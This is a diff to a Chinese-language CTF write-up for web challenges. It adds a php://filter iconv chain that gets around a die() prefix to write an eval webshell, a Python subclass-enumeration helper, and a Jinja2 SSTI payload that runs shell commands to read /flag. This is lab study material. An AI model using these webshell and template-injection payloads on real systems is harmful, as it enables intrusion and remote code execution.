@@ -3700,9 +3700,75 @@ poc
 
 直接get传参读flag
 
+```
+?file=flag.php
+```
+
 ![image-20250107143725806](./assets/image-20250107143725806.png)
 
+#### web117
 
+web87的后续 死亡绕过
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: yu22x
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-01 18:16:59
+
+*/
+highlight_file(__FILE__);
+error_reporting(0);
+function filter($x){
+    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
+        die('too young too simple sometimes naive!');
+    }
+}
+$file=$_GET['file'];
+$contents=$_POST['contents'];
+filter($file);
+file_put_contents($file, "<?php die();?>".$contents);
+```
+
+这题过滤了一些php的协议和转换器
+
+但是没过滤掉filter和convert
+
+我们可以考虑用filter搭配convert.iconv.*过滤器来构造出payload
+
+参考文章：[详解php://filter以及死亡绕过_filter绕过过滤-CSDN博客](https://blog.csdn.net/woshilnp/article/details/117266628)
+
+```php
+<?php
+$enc = iconv("UCS-2BE","UCS-2LE", '<?php @eval($_GET[1]);?>');
+echo $enc;
+?>
+```
+
+首先我们先将一句话木马从UCS-2BE转换成UCS-2LE
+
+```
+?<hp pe@av(l_$EG[T]1;)>?
+```
+
+接着构造payload将一句话木马从UCS-2LE转换回UCS-2BE，同时破坏掉<?php die();?>
+
+效果如下
+
+![image-20250108125928677](assets/image-20250108125928677.png)
+
+payload:
+
+```
+file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php
+contents=?<hp pe@av(l_$EG[T]1;)>?
+```
+
+成功写入一句话木马，拿到flag
 
 
 
@@ -5306,8 +5372,7 @@ api/?id=1' union select 1,(select group_concat(schema_name) from information_sch
 //检查结果是否有flag
     if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
       $ret['msg']='查询成功';
-    }
-      
+}     
 ```
 
 ​     
@@ -6200,6 +6265,51 @@ else{
     die('scheme');
 }
 ?>
+```
+
+### ssti
+
+通过遍历找模块
+
+```python
+from flask import Flask, request
+from jinja2 import Template
+
+
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    search = 'os'   #你想利用的模块
+    num = -1
+    for i in ().__class__.__base__.__subclasses__():
+        num += 1
+        try:
+            if search in i.__init__.__globals__.keys():
+                print(i, num)
+        except:
+            # print("no")
+            pass
+
+
+if __name__ == "__main__":
+    app.run()
+```
+
+#### web361
+
+没有waf，直接打
+
+```
+{{g.pop.__globals__.__builtins__['__import__']('os').popen('cat /flag').read()}}
+```
+
+
+
+#### web362
+
+```
+
 ```
 
 
